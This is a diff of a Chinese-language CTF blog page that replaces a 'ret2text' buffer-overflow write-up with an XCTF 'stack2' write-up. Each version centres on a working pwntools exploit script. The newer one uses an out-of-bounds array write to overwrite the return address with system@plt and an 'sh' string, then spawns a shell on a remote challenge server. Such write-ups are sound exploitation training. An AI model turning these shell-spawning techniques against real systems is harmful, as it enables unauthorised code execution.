@@ -4,27 +4,18 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ret2text, 微凉">
-    <meta name="description" content="
-首先checksec
+    <meta name="keywords" content="stack2, 微凉">
+    <meta name="description" content="checksec
 
-运行
+run
 
-拖入IDA
-
-发现危险函数
+ida+程序分析(ps:计算数组首地址距离retn的偏移时异常痛苦)
 
 
 
 
-发现system和bin/sh
-
-
-
-找到s相对于ebp的距离0x6c+4
-
-编写exp
-from pwn import *                       ">
+​                                                         
+expfrom">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -36,7 +27,7 @@ from pwn import *                       ">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ret2text | 微凉</title>
+    <title>stack2 | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -223,12 +214,12 @@ from pwn import *                       ">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ret2text</h1>
+                    <h1 class="description center-align post-title">stack2</h1>
                 </div>
             </div>
         </div>
@@ -348,6 +339,14 @@ from pwn import *                       ">
                                 <span class="chip bg-color">栈溢出</span>
                             </a>
                         
+                            <a href="/tags/xctf/">
+                                <span class="chip bg-color">xctf</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/">
+                                <span class="chip bg-color">数组越界</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -369,7 +368,7 @@ from pwn import *                       ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-10
+                    2022-01-15
                 </div>
                 
 
@@ -378,7 +377,7 @@ from pwn import *                       ">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    81
+                    142
                 </div>
                 
 
@@ -403,43 +402,60 @@ from pwn import *                       ">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li><p>首先checksec</p>
-<img src="/2022/01/10/ret2text/checksec.png" alt="image-20220110191034015" style="zoom:80%;"></li>
-<li><p>运行</p>
-<img src="/2022/01/10/ret2text/run.png" alt="image-20220110191210204" style="zoom:80%;"></li>
-<li><p>拖入IDA</p>
-<ul>
-<li><p>发现危险函数</p>
-<img src="/2022/01/10/ret2text/function.png" alt="image-20220110191317331" style="zoom:80%;"></li>
-</ul>
-</li>
-<li><ul>
-<li><p>发现system和bin/sh</p>
-<img src="/2022/01/10/ret2text/system.png" alt="image-20220110191459039" style="zoom:80%;"></li>
-</ul>
-</li>
-<li><p>找到s相对于ebp的距离0x6c+4</p>
-<img src="/2022/01/10/ret2text/s.png" alt="image-20220110194447617" style="zoom: 50%;"></li>
-<li><p>编写exp</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                           
-  2 log_level = 'debug'
-  3 local = 1
-  4 if local:
-  5     r = process("./ret2text")
-  6 else:
-  7     r = remote("")
-  8 elf = ELF("./ret2text")
-  9  
- 10 s = 0x6c + 4
- 11 system_addr = 0x0804863A
- 12  
- 13 payload = b'a'*s+p32(system_addr)
- 14 r.sendline(payload)
- 15  
- 16 r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ul>
+                <h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/15/stack2/checksec.png" alt="image-20220115142055209" style="zoom:80%;">
+
+<h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/15/stack2/run.png" alt="image-20220115142227040" style="zoom:80%;">
+
+<h3 id="ida-程序分析"><a href="#ida-程序分析" class="headerlink" title="ida+程序分析"></a>ida+程序分析</h3><p>(ps:计算数组首地址距离retn的偏移时异常痛苦)</p>
+<h3 id><a href="#" class="headerlink" title></a><img src="/2022/01/15/stack2/array.png" alt="image-20220115212659649" style="zoom:80%;"></h3><img src="/2022/01/15/stack2/addr.png" alt="image-20220115212936878" style="zoom:80%;">
+
+
+
+<p>​                                                         <img src="/2022/01/15/stack2/ret.png" alt="image-20220115213107027" style="zoom:80%;"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context.log_level = 'debug'
+elf = ELF("./stack2")
+local = 0
+if local:
+    r = process("./stack2")
+else:
+    r = remote("111.200.241.244",60371)
+
+sh_addr = 0x08048987
+#sh_addr = 0x08048ab3
+system_plt = 0x08048450
+offset = 0x84
+
+r.sendlineafter("you have:\n","1")
+r.sendlineafter("numbers\n","1")
+
+def sendpayload(addr,i):
+    r.sendlineafter("exit\n","3")
+    r.sendlineafter("change:\n",str(addr))
+    r.sendlineafter("number:\n",str(i))
+
+#发送system地址
+sendpayload(offset,0x50)
+sendpayload(offset+1,0x84)
+sendpayload(offset+2,0x04)
+sendpayload(offset+3,0x08)
+
+offset += 8
+
+sendpayload(offset,0x87)
+sendpayload(offset+1,0x89)
+sendpayload(offset+2,0x04)
+sendpayload(offset+3,0x08)    
+
+r.sendlineafter("exit\n","5")
+r.interactive()
+
+#0x080488F2 ret
+#0x080486D5 eax
+#0xffffd18c ret_esp
+#0xffffd108 eax_array
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -466,7 +482,7 @@ from pwn import *                       ">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://breeze-666.github.io/2022/01/10/ret2text/">https://breeze-666.github.io/2022/01/10/ret2text/</a>
+                    <a href="https://breeze-666.github.io/2022/01/15/stack2/">https://breeze-666.github.io/2022/01/15/stack2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -506,6 +522,14 @@ from pwn import *                       ">
                             
                                 <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
                                     <span class="chip bg-color">栈溢出</span>
+                                </a>
+                            
+                                <a href="/tags/xctf/">
+                                    <span class="chip bg-color">xctf</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/">
+                                    <span class="chip bg-color">数组越界</span>
                                 </a>
                             
                         </div>
@@ -555,13 +579,13 @@ from pwn import *                       ">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/01/10/ret2shellcode/">
+                <a href="/2022/01/15/fuzz/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ret2shellcode">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="warmup">
                         
-                        <span class="card-title">ret2shellcode</span>
+                        <span class="card-title">warmup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -572,7 +596,7 @@ from pwn import *                       ">
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-10
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
                         </span>
                         <span class="publish-author">
                             
@@ -593,6 +617,14 @@ from pwn import *                       ">
                         <span class="chip bg-color">栈溢出</span>
                     </a>
                     
+                    <a href="/tags/xctf/">
+                        <span class="chip bg-color">xctf</span>
+                    </a>
+                    
+                    <a href="/tags/fuzz/">
+                        <span class="chip bg-color">fuzz</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -604,13 +636,13 @@ from pwn import *                       ">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/10/defcon-2015-r0pbaby/">
+                <a href="/2022/01/14/data/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Defcon-2015-r0pbaby">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="实时数据检测">
                         
-                        <span class="card-title">Defcon-2015-r0pbaby</span>
+                        <span class="card-title">实时数据检测</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -621,7 +653,7 @@ from pwn import *                       ">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
                             </span>
                         <span class="publish-author">
                             
@@ -638,12 +670,12 @@ from pwn import *                       ">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
+                    <a href="/tags/xctf/">
+                        <span class="chip bg-color">xctf</span>
                     </a>
                     
-                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">
-                        <span class="chip bg-color">二进制</span>
+                    <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                        <span class="chip bg-color">格式化字符串</span>
                     </a>
                     
                 </div>
